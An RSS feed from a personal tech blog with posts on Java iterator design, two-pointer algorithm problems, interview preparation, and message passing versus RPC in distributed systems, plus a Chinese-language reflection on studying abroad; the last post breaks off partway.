<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Pufan Jiang&#39;s Blog</title>
    <description>Pufan Jiang&#39;s personal blog, including lots of tech blogs, photo shooting etc.</description>
    <link>http://huangxuan.me/</link>
    <atom:link href="http://huangxuan.me/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Sat, 05 Mar 2016 01:02:51 -0800</pubDate>
    <lastBuildDate>Sat, 05 Mar 2016 01:02:51 -0800</lastBuildDate>
    <generator>Jekyll v2.4.0</generator>
    
      <item>
        <title>Cracking Code Challenge The Hard Way - Iterator Design Pattern</title>
        <description>&lt;h1 id=&quot;design-problem---iterator&quot;&gt;Design Problem - Iterator&lt;/h1&gt;

&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;

&lt;p&gt;This article talks about how to design a generic iterator that supports &lt;code&gt;next()&lt;/code&gt;, &lt;code&gt;hasNext()&lt;/code&gt; and &lt;code&gt;getCurrent()&lt;/code&gt; methods.&lt;/p&gt;

&lt;h2 id=&quot;why-use-iterator&quot;&gt;Why use iterator?&lt;/h2&gt;

&lt;p&gt;To traverse a data structure, one could either use index to go through it, or could use an iterator. An iterator basically has several advantages over index traverse:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Most important, at least to me, is that given a streaming data, which means we don’t know size of input, then we could not use index to go through since we don’t know when to stop.&lt;/li&gt;
  &lt;li&gt;Even we could know the size beforehand, it could be difficult/expensive to calculate this. For example, calculation of size of a LinkedList could be O(N), through not the case in Java.&lt;/li&gt;
  &lt;li&gt;There are quite a few important data structures that doesn’t support random access, including Set, LinkedList, Tree etc.&lt;/li&gt;
  &lt;li&gt;Iterator provides a high level concept of traversing, using the general function &lt;code&gt;hasNext()&lt;/code&gt;, &lt;code&gt;next()&lt;/code&gt; etc. so that we could iterate despite underlying data structure. See more about &lt;a href=&quot;https://en.wikipedia.org/wiki/Generic_programming&quot;&gt;generic programming&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;Iterator is fail-fast (at least in Java), which means it could help to prevent some concurrent modification conflict. On the other side, index traverse doesn’t provide such protection.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;what-is-iterator&quot;&gt;What is Iterator&lt;/h2&gt;

&lt;p&gt;The core idea of iterator is that it knows&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;the current position in a data structure&lt;/li&gt;
  &lt;li&gt;how to go to the next position&lt;/li&gt;
  &lt;li&gt;if it is the end of data structure&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;By abstracting these three most important functions, an iterator has to implement three corresponding methods:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code&gt;getCurrent()&lt;/code&gt; return current value pointed by iterator&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;next()&lt;/code&gt; go to next position. If such position doesn’t exist, throw an exception.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;hasNext()&lt;/code&gt; check if it is the end, this function should be called each time before we call &lt;code&gt;next()&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Given these information, we have our iterator interface:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;public interface Iterator&amp;lt;T&amp;gt; {
	public T getCurrent() throws NoSuchElementException;
	public T next() throws NoSuchElementException;
	public boolean hasNext();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Fairly easy, right? Indeed it is! Now let’s see how to design a concrete iterator.&lt;/p&gt;

&lt;h2 id=&quot;iterator-of-arraylist&quot;&gt;Iterator of ArrayList&lt;/h2&gt;

&lt;p&gt;In Java, get size of ArrayList is constant time, so we could use size as boundary to check if we hit end of list.&lt;/p&gt;

&lt;p&gt;First, we need some private field to help manage iteration.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;//Size of underlying data structure
private int size;
//Used to iterate through data structure, it always points to next element
//to be iterated
private int cursor;
//Point to current value, initially -1
private int current;
//Used to save underlying data structure
private Object[] elementData;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then, check if we hit end of list is simple, just check if cursor is at end of list.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;/*
 * Check if we hit end of data structure.
 */
public boolean hasNext() {
    return cursor != size;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In order to get next value, we first check &lt;code&gt;hasNext()&lt;/code&gt;, if true then we go on return the value pointed by cursor, otherwise we throw exception.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;/*
 * Get next value of iterator, move iterator to next position at the
 * same time. If already at end of data structure, throw exception.
 */
@SuppressWarnings(&quot;unchecked&quot;)
public T next() throws NoSuchElementException {
    if(!hasNext()) {
        throw new NoSuchElementException();
    }
    current = cursor++;
    return (T)elementData[current];
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finally, to get current value is very straightforward.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;/*
 * Get current value pointed by iterator
 */
@SuppressWarnings(&quot;unchecked&quot;)
public T getCurrent() throws NoSuchElementException {
    if(current &amp;lt; 0) {
        throw new NoSuchElementException();
    }
    return (T)elementData[current];
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You could get full source code at &lt;a href=&quot;https://github.com/otnt/CodeChallenge/tree/master/DesignPattern/iterator/src/iterator&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;java-open-jdk-implementation&quot;&gt;Java Open-JDK Implementation&lt;/h2&gt;

&lt;p&gt;To learn more about iterator in Java, I highly suggest you read some Java source code. They are extremely easy to follow.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/6-b27/java/util/Iterator.java&quot;&gt;Iterator interface&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/8u40-b25/java/util/ArrayList.java#ArrayList.Itr&quot;&gt;ArrayList Iterator&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/6-b14/java/util/ListIterator.java#ListIterator&quot;&gt;ListIterator interface&lt;/a&gt; (An iterator supports both moving forward and backward)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/8u40-b25/java/util/ArrayList.java#ArrayList.ListItr&quot;&gt;ArrayList ListIterator&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/8u40-b25/java/util/HashMap.java#HashMap.HashIterator&quot;&gt;Hash Iterator&lt;/a&gt; (Iterator implementation in HashMap is a little bit different since the underlying data structure is different. But the general idea is the same)&lt;/li&gt;
&lt;/ol&gt;

</description>
        <pubDate>Sat, 05 Mar 2016 01:01:00 -0800</pubDate>
        <link>http://huangxuan.me/2016/03/05/Cracking-Code-Challenge-The-Hard-Way-Iterator-Design-Pattern/</link>
        <guid isPermaLink="true">http://huangxuan.me/2016/03/05/Cracking-Code-Challenge-The-Hard-Way-Iterator-Design-Pattern/</guid>
        
        <category>design pattern</category>
        
        <category>iterator</category>
        
        <category>java</category>
        
        
      </item>
    
      <item>
        <title>Why Go Abroad</title>
        <description>&lt;h1 id=&quot;why-go-abroad&quot;&gt;Why Go Abroad?&lt;/h1&gt;

&lt;h2 id=&quot;why-this-question&quot;&gt;Why this question?&lt;/h2&gt;

&lt;p&gt;最近和浩宇——一位很要好的学弟——聊天，问我对出国与否的看法。突然间我很好奇SV的伙伴们都有何独特见解。所以在这里搜罗了一些CMUSV朋友的观点。对之后考虑出国的年轻人可能有些许借鉴之用，而我们这些兄弟/姐妹日后回顾起来一定也别有风味。&lt;/p&gt;

&lt;h2 id=&quot;why-you-decided-go-abroad&quot;&gt;Why you decided go abroad?&lt;/h2&gt;

&lt;p&gt;&lt;em&gt;浦饭的回答：&lt;/em&gt;&lt;br /&gt;
我最初决定出国的原因很LOW。一是我想转做software，而我本科学的是communication/signal方向，几乎没有CS背景，并且实习经历为零，所以读master是看起来最快最有效的转行方法。二是我从小学到大学全是在上海，一直在父母的关照之下让我有些无所适从，让我在偶尔必须迈出恐惧的步伐时选择了退缩，所以我要离开父母。&lt;/p&gt;

&lt;h2 id=&quot;why-suggest-going-abroad&quot;&gt;Why suggest going abroad?&lt;/h2&gt;

&lt;p&gt;&lt;em&gt;浦饭的回答：&lt;/em&gt;&lt;br /&gt;
1.优质的教学+Inspiring的环境。作为体会过CMU两个校区的人我有不少感触。SV这边地处Bay Area，在周遭走一圈就觉得浑身亢奋，想着当年Google在一个小办公室中实现日后所向披靡的互联网入口，想着Zack在这里实现每天约谈一个陌生人的计划，想着无数公司和智慧的火花在这里兴起与衰落，感觉肾上腺素爆棚。另一方面，CMU Pitts本部的课程质量相信绝不逊于Stanford、MIT、Berkeley这三所顶级学府；这里有云平台、分布式系统、计算机系统、大数据处理、机器学习、计算机安全等各行的顶级大牛，并且乐意分享与解答学生问题，有太多知识的盛宴。&lt;/p&gt;

&lt;p&gt;2.多样化/Diversity。和印度同学交流，我才知道绝大部分印度人都有自己的宗教信仰，而印度语言繁杂，几乎每个人都会至少2-3个不同语言，印度人素食主义者非常多，而他们确实坚信阅兵式上叠罗汉式的表演非常有创意。和台湾同学交流，可以和他们抱怨中国护照的不方便之处，抱怨中国传统文化的断层，也可以肆无忌惮“嘲笑”台湾经济的衰退。和黎巴嫩同学交流，才知道原来他们也搞不清中东到底在玩什么XD&lt;/p&gt;

&lt;p&gt;3.创客精神。这点国内未必会差，但起码Bay Area的创客精神很浓。湾区作为engineer的小天堂，所以开源精神收到追捧，有那么多人希望用创新的手段改善人们的生活，有那么多让人拍案叫绝的想法，而不是仅仅把工作当做挣钱的手段。&lt;/p&gt;

&lt;h2 id=&quot;why-suggest-not-going-abroad&quot;&gt;Why suggest NOT going abroad?&lt;/h2&gt;

&lt;p&gt;&lt;em&gt;浦饭的回答：&lt;/em&gt;&lt;br /&gt;
1.交流/文化的障碍。这是不少人绕不开的一个话题，我也在struggle中。&lt;/p&gt;

&lt;p&gt;2.无依无靠。身在国外，可以利用的现成资源肯定是减少了，大部分资源要靠自己去争取。&lt;/p&gt;

&lt;p&gt;3.Losting。尽管之前说了湾区那么多好话，但有时静下心来想，会觉得湾区的创客精神也有点类似于AIESEC这类组织的“鸡血式培训”，它让你work hard, play harder，让你获得成就感，让你用自己的能力改变世界，让你逃避一些内心不敢思考的东西。。。有时候我问自己，如果明天突然获得两天假期，不准干任何技术相关内容，我是否会有些许无所适从。而这种不安感，我觉得是lost内心的体现。&lt;/p&gt;

&lt;h2 id=&quot;anything-else-you-wanna-say-dream-life-disappointments&quot;&gt;Anything else you wanna say? Dream… Life… Disappointments…&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;浦饭的回答：&lt;/em&gt;&lt;br /&gt;
最近觉得奋斗也是一种毒品——付出、收获的循环也不过是短暂的快感，而后只能靠更大的付出与更大的收获来维持这多巴胺的分泌，这和毒品简直如出一辙。之前所说的losting，就像是毒瘾发作，如果长期得不到“收获”这包白粉，就会抓狂、心绪混乱。&lt;/p&gt;

&lt;p&gt;而这也是我坚持反对盲目奋斗、盲目努力的原因，没有一个很好的释放途径、一个阶梯式成长的路线，就像一次倾家荡产买了大批毒品吸食，而后续无法持续补给，最终很可能是毒发而亡。&lt;/p&gt;

&lt;p&gt;从男人角度思考，我觉得事业上一定要有dream，才不会鼠目寸光，不会束手束脚；而家庭上要尽早落地，才能避免盲目的拼搏挣断了现实的风筝线。&lt;/p&gt;
</description>
        <pubDate>Fri, 26 Feb 2016 02:17:00 -0800</pubDate>
        <link>http://huangxuan.me/2016/02/26/why-go-abroad/</link>
        <guid isPermaLink="true">http://huangxuan.me/2016/02/26/why-go-abroad/</guid>
        
        <category>personal</category>
        
        <category>thought</category>
        
        <category>life</category>
        
        
      </item>
    
      <item>
        <title>Cracking Code Challenge The Hard Way - Two pointerswo pointers</title>
        <description>&lt;h2 id=&quot;tldr&quot;&gt;TL;DR;&lt;/h2&gt;

&lt;p&gt;Two pointers is an idea applicable to many algorithm challenge. The key idea is to think in a parallel way, rather than sequential way which is more natural to humans.&lt;/p&gt;

&lt;p&gt;In this post, I will show how to apply the idea of two pointers to these example problems:&lt;br /&gt;
1.&lt;a href=&quot;https://leetcode.com/problems/intersection-of-two-linked-lists/&quot;&gt;Intersection of Two Linked Lists&lt;/a&gt;&lt;br /&gt;
2.&lt;a href=&quot;https://leetcode.com/problems/merge-sorted-array/&quot;&gt;Merge Sorted Array&lt;/a&gt;&lt;br /&gt;
3.&lt;a href=&quot;https://leetcode.com/problems/container-with-most-water/&quot;&gt;Container With Most Water&lt;/a&gt;&lt;br /&gt;
4.&lt;a href=&quot;https://leetcode.com/problems/trapping-rain-water/&quot;&gt;Trapping Rain Water&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;how-to-use-two-pointers-idea&quot;&gt;How to use two pointers idea&lt;/h2&gt;

&lt;p&gt;Whenever you find the problem has two boundaries, or two chains (a human-readable word for LinkedList XD) etc. you could try with two pointers idea.&lt;/p&gt;

&lt;p&gt;The trick for using two pointers is three step:&lt;br /&gt;
1.Identify where to begin, i.e. where are the start points of the two pointers.&lt;br /&gt;
2.Identify how to move on, i.e. each step how should the two pointers ‘walk’, which of them should ‘walk’.&lt;br /&gt;
3.Identify when to stop, i.e. the condition to stop or swap turn in ‘walk’.&lt;/p&gt;

&lt;h2 id=&quot;example-1---intersection-of-two-linked-lists&quot;&gt;Example 1 - Intersection of Two Linked Lists&lt;/h2&gt;

&lt;p&gt;See problem here: &lt;a href=&quot;https://leetcode.com/problems/intersection-of-two-linked-lists/&quot;&gt;Intersection of Two Linked Lists&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;There are lots of ways to solve this problem, with tradeoff among time, space and development complexity.&lt;/p&gt;

&lt;p&gt;When analyzing complexity of algorithm, we suppose both linked list has length N, and number of nodes before intersection is L.&lt;/p&gt;

&lt;h3 id=&quot;most-straightforward-way&quot;&gt;Most straightforward way&lt;/h3&gt;

&lt;p&gt;The most straightforward way is first iterate one linked list, store every node in a hash table. Then iterate the second linked list, check whether the node is already in hash table for each iteration and stop when find the first one.&lt;/p&gt;

&lt;p&gt;The time complexity is O(N + L). And space complexity is O(N).&lt;/p&gt;

&lt;h3 id=&quot;improve-space-complexity-to-o1&quot;&gt;Improve space complexity to O(1)&lt;/h3&gt;

&lt;p&gt;Suppose the lengths of two linked lists are the same, i.e. before intersection the two linked lists have same number of nodes, then if there are two pointers walking through two linked list at same time and speed, then the first time they meet it the intersection.&lt;/p&gt;

&lt;p&gt;Now the problem is we are not guaranteed that these two linked list are of same length. Could we possibly make them the same? &lt;strong&gt;stop here, and think&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Of course! If we could calculate the difference of lengths of two linked list, then just pass several nodes of the longer linked list, then the lengths are the same!&lt;/p&gt;

&lt;p&gt;This algorithm has O(2N + 2L) time complexity but only O(1) space complexity.&lt;/p&gt;

&lt;p&gt;The solution of this method is actually given &lt;a href=&quot;http://www.geeksforgeeks.org/write-a-function-to-get-the-intersection-point-of-two-linked-lists/&quot;&gt;here at method 3&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;improve-time-complexity-to-o2l&quot;&gt;Improve time complexity to O(2L)&lt;/h3&gt;

&lt;p&gt;This is my original solution that I never find online. This solution actually use more space but is faster averagely.&lt;/p&gt;

&lt;p&gt;So the problem of our naive solution is that we traverse the two linked lists one by one. Notice these two linked lists are actually symmetric, so that we could check if node in list A has been met in list B ……. and also if node in list B has been met in list A &lt;strong&gt;at same time&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;Given this idea, we could have two pointers starting together, each has a hash table saving iterated nodes. Each iteration, both pointers check if the new node is in hash table of the other pointer. And it could stop as soon as one of pointer find such a node, which is the intersection.&lt;/p&gt;

&lt;p&gt;This algorithm gives O(2L) time complexity and O(2L) space complexity. So in worst case, this is O(2N) time complexity and O(2N) space complexity. But averagely it has O(N) time complexity and O(N) space complexity.&lt;/p&gt;

&lt;h2 id=&quot;example-2---merge-sorted-array&quot;&gt;Example 2 - Merge Sorted Array&lt;/h2&gt;

&lt;p&gt;See problem here: &lt;a href=&quot;https://leetcode.com/problems/merge-sorted-array/&quot;&gt;Merge Sorted Array&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This is a great example to use two pointer idea. If you go through two arrays one by one, then either you could first save one array in a hash table, and check existence when traversing the second array, or you could use binary search when traversing both arrays. Both methods sacrifice time or space to some extend.&lt;/p&gt;

&lt;p&gt;The actual trick in this problem is the second step of two pointers solution, i.e. how to move on. Notice the arrays are sorted, so that we are guaranteed the pointed value is increasing. This indicates, if pointer A is pointing to larger number than pointer B, then any number after pointer A could not be the same as the number at pointer B.&lt;/p&gt;

&lt;p&gt;This key idea results in this algorithm.&lt;/p&gt;

&lt;h2 id=&quot;example-3----container-with-most-water&quot;&gt;Example 3 – Container With Most Water&lt;/h2&gt;

&lt;p&gt;See problem here: &lt;a href=&quot;https://leetcode.com/problems/container-with-most-water/&quot;&gt;Container With Most Water&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;As you may noticed, the constraint of this problem that requires two boundaries falls in pattern of two pointers. So a quick idea is using two pointers as two boundaries, and to find two position than could hold most water.&lt;/p&gt;

&lt;p&gt;Now let’s go through three steps in two pointers problem.&lt;/p&gt;

&lt;p&gt;First, where to begin? The naive way is go from one side to another side and search all possible combinations. This will result in O(N^2) time complexity. It sucks. A commonly used trick is we one pointer go from begin and another from end, then two pointers go face to face towards middle. The key idea is a little bit similar to dynamic programming, i.e. if I could know what happen given boundary [i, j], then I could calculate the condition given boundary [i + 1, j - 1] really fast.&lt;/p&gt;

&lt;p&gt;Second, how to move on? To solve the problem with O(N) algorithm, each iteration must give one choice. What I mean is, given condition of [i, j], we could then check [i + 1, j] and [i, j - 1] and to iteratively find the result, but in this way it still is a O(N^2) algorithm. If we could eliminate one of the possibility, then the algorithm would be O(N)! Actually we could do that. If height at i is smaller than height at j, then there’s no reason for us to check [i, j - 1]! So we move the one with smaller height toward the larger one.&lt;/p&gt;

&lt;p&gt;Third, when to stop? Obviously, when two pointers meet, we stop.&lt;/p&gt;

&lt;p&gt;The time complexity of this algorithm is O(N) and space complexity is O(1).&lt;/p&gt;

&lt;h2 id=&quot;example-4----trapping-rain-water&quot;&gt;Example 4 – Trapping Rain Water&lt;/h2&gt;

&lt;p&gt;See problem here: &lt;a href=&quot;https://leetcode.com/problems/trapping-rain-water/&quot;&gt;Trapping Rain Water&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Although this is a hard level problem in leetcode, given the solution to above problem, it should be easy to think of the solution to this one.&lt;/p&gt;

&lt;p&gt;To briefly explain the solution to this problem, we use two pointer start from begin and end, and go toward each other. Each time we move the pointer with shorter block to the one with bigger, and calculate the water trapping within the range. We stop when two pointers meet.&lt;/p&gt;
</description>
        <pubDate>Fri, 19 Feb 2016 20:53:00 -0800</pubDate>
        <link>http://huangxuan.me/2016/02/19/Cracking-Code-Challenge-The-Hard-Way-Two-pointers/</link>
        <guid isPermaLink="true">http://huangxuan.me/2016/02/19/Cracking-Code-Challenge-The-Hard-Way-Two-pointers/</guid>
        
        <category>Two Pointers</category>
        
        <category>Code Challenge</category>
        
        <category>leetcode</category>
        
        
      </item>
    
      <item>
        <title>Cracking Code Challenge The Hard Way - Introduction</title>
        <description>&lt;blockquote&gt;
  &lt;p&gt;This blog series are to help new grads like me to prepare algorithm interview/tech interview. These posts focus on common useful data structures, algorithms, test strategies and some tricks to help you to crack code challenge!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;situation-at-tech-industry-is-not-that-bad&quot;&gt;Situation at tech industry is not that bad&lt;/h2&gt;

&lt;p&gt;Yes, many said another tech bubble is bursting. Twitter fired around 8 percent of their employees, much are from engineer and product teams[1]. LinkedIn’s value drop by almost half (nearly 11 billions) in one single night[2]. STEM Opt extension is under possibility to be cut[3].&lt;/p&gt;

&lt;p&gt;But, as far as I have observed, the situation is not that bad. Tech companies still pay large amount of dollars to provide flights and hotels for interviewees. The head counts of large tech companies(e.g. FLAG) may be reduced but overall head counts, including great number of emerging small companies, is still amazingly high. New Grads are still getting decent salaries and bonus.&lt;/p&gt;

&lt;h2 id=&quot;yet-you-need-to-be-well-prepared&quot;&gt;Yet you need to be well-prepared&lt;/h2&gt;

&lt;p&gt;I have no dare neither experience to foretell the future of computer science industry. But the truth is competition has significantly raised during these years. Even five years ago, the famous &lt;a href=&quot;leetcode.com&quot;&gt;Leetcode.com&lt;/a&gt; (a coding practice platform) has no more than one hundred problems and a student mastering all these solutions would be very likely to be hired by good tech companies. But the website has more than three hundred problems now (334 on Feb 19th 2016) and one not only need to solve these problems but is also required to solve them bug-freely.&lt;/p&gt;

&lt;p&gt;It is hard. It is the reality.&lt;/p&gt;

&lt;h2 id=&quot;whats-this-blog-series-is&quot;&gt;What’s this blog series is?&lt;/h2&gt;

&lt;p&gt;The motivation for this series is to help young CS students, especially newbies, to better prepare frequent technical questions.&lt;/p&gt;

&lt;p&gt;There are several common solution to all these questions, and each solution shows, given constraints or simplification of real-world scenario, how a software engineer thinks from a programmer’s perspective, i.e. tradeoff among space and time complexity or tradeoff among development complexity and algorithm efficiency etc.&lt;/p&gt;

&lt;p&gt;In this series, you would hopefully learn when and how to use some most useful data structures and algorithms, the difference and tradeoff among these data structures and algorithms, how to implement some of these data structures, and how to analyze time and space tradeoff among these data structures and algorithms.&lt;/p&gt;

&lt;h2 id=&quot;what-this-blog-series-is-not&quot;&gt;What this blog series is NOT?&lt;/h2&gt;

&lt;p&gt;I definitely absolutely totally do not want you to memorize the solutions here. Surely there are some patterns/templates that maybe helpful if you remember them. But the solution is based on an deep understanding of all those data structures and algorithms and a little bit of tricks.&lt;/p&gt;

&lt;p&gt;Remember that memorizing a solution always do no good to your interview.&lt;/p&gt;

&lt;h2 id=&quot;entries-to-cracking-code-challenge&quot;&gt;Entries to Cracking Code Challenge&lt;/h2&gt;

&lt;p&gt;Here is links for all articles in the series (continuously adding more).&lt;br /&gt;
1. Two pointers&lt;br /&gt;
2. Binary Tree (Binary tree, Thread Tree)&lt;br /&gt;
3. Dictionary Problem (Hashmap, Perfect hashing, Trie Tree)&lt;br /&gt;
3. Scanning Line Problem (Priority queue)&lt;br /&gt;
4. Sliding Stream and Sliding Window Problem (Priority queue and Monotone priority queue)&lt;br /&gt;
5. Dynamic Programming (Hashmap)&lt;br /&gt;
6. LinkedList&lt;br /&gt;
7. Search (Binary search, Hashmap)&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;

&lt;p&gt;[1]&lt;a href=&quot;http://www.sfgate.com/business/article/Twitter-to-lay-off-336-employees-6568501.php&quot;&gt;Twitter lays off 336 employees upon Dorsey’s return as CEO&lt;/a&gt;&lt;br /&gt;
[2]&lt;a href=&quot;http://www.reuters.com/article/linkedin-results-research-idUSKCN0VE1N0&quot;&gt;LinkedIn sheds $11 billion in value on stock’s worst day since debut&lt;/a&gt;&lt;br /&gt;
[3]&lt;a href=&quot;http://www.nafsa.org/Find_Resources/Supporting_International_Students_And_Scholars/ISS_Issues/Issues/Focus_On_STEM_OPT/&quot;&gt;Focus On STEM OPT&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Fri, 19 Feb 2016 16:12:00 -0800</pubDate>
        <link>http://huangxuan.me/2016/02/19/Cracking-Code-Challenge-The-Hard-Way-Introduction/</link>
        <guid isPermaLink="true">http://huangxuan.me/2016/02/19/Cracking-Code-Challenge-The-Hard-Way-Introduction/</guid>
        
        <category>Code Challenge</category>
        
        <category>Algorithm</category>
        
        <category>Data Structure</category>
        
        <category>Interview</category>
        
        
      </item>
    
      <item>
        <title>Talking within Distributed System</title>
        <description>&lt;blockquote&gt;
  &lt;p&gt;This is a short series about some important concepts in distributed system.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;tldr&quot;&gt;TL;DR;&lt;/h2&gt;

&lt;p&gt;In this article, I first tried to explain what’s difference between communication in distributed system and local machine.&lt;/p&gt;

&lt;p&gt;Then I talked about two most popular way to communicate within a distributed system, i.e. message passing and RPC, and analyzed the advantages and disadvantages of them.&lt;/p&gt;

&lt;p&gt;Finally, I introduced two most successful protocol using these two communication idea, i.e. RESTful and Thrift.&lt;/p&gt;

&lt;h2 id=&quot;why-talking-within-distributed-system-is-different-from-local-machine&quot;&gt;Why talking within distributed system is different from local machine?&lt;/h2&gt;

&lt;p&gt;In a local machine, when process A is communicating with process B, it could be done in a synchronized fashion guaranteed by electrical circuit or the so-called bus built in your laptop or server. So the delivery time is always constant, corresponding to several clock cycles.&lt;/p&gt;

&lt;p&gt;The fundamental difference of distributed system and local machine is due to network unreliability. When machine A is sending message to or call function at machine B, there is not such bus connecting them so that they could only communicate through network. So either machine A get an acknowledgement message and it could be sure that machine B receive the message, or it has to wait indefinitely since it could never tell whether the message is lost or it is network congestion.&lt;/p&gt;

&lt;p&gt;So it is the case that I know what I know, but I don’t know what others know, and I don’t know what others know others know…&lt;/p&gt;

&lt;h2 id=&quot;an-example&quot;&gt;An example&lt;/h2&gt;

&lt;p&gt;Through the next of this post, we will examine a simple common example &lt;code&gt;distcp&lt;/code&gt;. So the semantic of &lt;code&gt;distcp&lt;/code&gt; is the same as &lt;code&gt;cp&lt;/code&gt; (copy) method, it copies data from one location to another.&lt;/p&gt;

&lt;p&gt;More specifically, when machine A runs &lt;code&gt;distcp path1/file path2&lt;/code&gt;, it copy &lt;code&gt;file&lt;/code&gt; from &lt;code&gt;path1&lt;/code&gt; to &lt;code&gt;path2&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;message-passing&quot;&gt;Message Passing&lt;/h2&gt;

&lt;p&gt;So message passing is actually the most straightforward and also most widely used way to implement distributed system communication (think about Internet!).&lt;/p&gt;

&lt;p&gt;Message Passing defines two basic method, &lt;strong&gt;send()&lt;/strong&gt; and &lt;strong&gt;receive()&lt;/strong&gt;.  It sends the whole information including operator (in our case it is &lt;code&gt;distcp&lt;/code&gt;) and operands (in our case it is &lt;code&gt;file&lt;/code&gt; and &lt;code&gt;path&lt;/code&gt;) through network. And when receiver receives the message, it lookups the operator and finds corresponding local method and then finishes the job.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Advantages&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;It is straightforward/user-friendly.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disadvantages&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;However, despite the good point of message passing, this method leaves a lot of burden to application programmer. A common message passing is very like this:&lt;br /&gt;
On sender’s side:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;MessageFactor.createMessage(&quot;distcp&quot;).setArgument(0, &quot;path1/file&quot;).setArgument(1, &quot;path2&quot;).send(ip of machine B)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On receiver’s side:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;operator = receive().getOperator();
switch(operator) {
	case &quot;distcp&quot;: copy to path; break;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There are two obvious problem.&lt;br /&gt;
1.Programmer needs to do lots of work to control the logic, especially on receiver’s side.&lt;br /&gt;
2.The program could not make use of compile check to make sure the sending message is correct. This significantly increase the possibility of runtime error.&lt;/p&gt;

&lt;h2 id=&quot;remote-procedure-call-rpc&quot;&gt;Remote Procedure Call (RPC)&lt;/h2&gt;

&lt;p&gt;So to reduce the burden of programmers and make our program more predictable, RPC is a good idea.&lt;/p&gt;

&lt;p&gt;The core idea of RPC is to provide an interface for both local and remote procedure call, so that programmer could call remote function just like call local function.&lt;/p&gt;

&lt;p&gt;So the RPC way of our function is very like to be this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;register_path(&quot;path1&quot;, ip of machine A);
register_path(&quot;path2&quot;, ip of machine B);
dist(&quot;path1/file&quot;, &quot;path2&quot;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And it is done! How to find the file and how to bind the data is left to RPC service. After binding the path and machine, the programmer doesn’t need to worry about the whole logic. Moreover, now we could at compile time check whether the programmer provides exactly two arguments , reducing runtime error.&lt;/p&gt;

&lt;p&gt;Also, it a lot of distributed system, e.g. Hadoop platform, there’s a master machine to take care of path binding, so the two &lt;code&gt;register_path&lt;/code&gt; method could be avoided as well!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; To understand how the RPC service is implemented, I encourage you to further read some posts online or this paper &lt;a href=&quot;http://doi.acm.org/10.1145/2080.357392&quot;&gt;Implementing remote procedure calls&lt;/a&gt; by Andrew and Bruce.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Advantages&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;1.RPC provide the abstraction of procedure call so that programmers could use these services easily just as using local methods.&lt;br /&gt;
2.It also helps reducing runtime errors.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disadvantages&lt;/strong&gt;&lt;br /&gt;
Now RPC may seems really attracting, it has one important disadvantages compared to message passing – the service itself is much complicated.&lt;/p&gt;

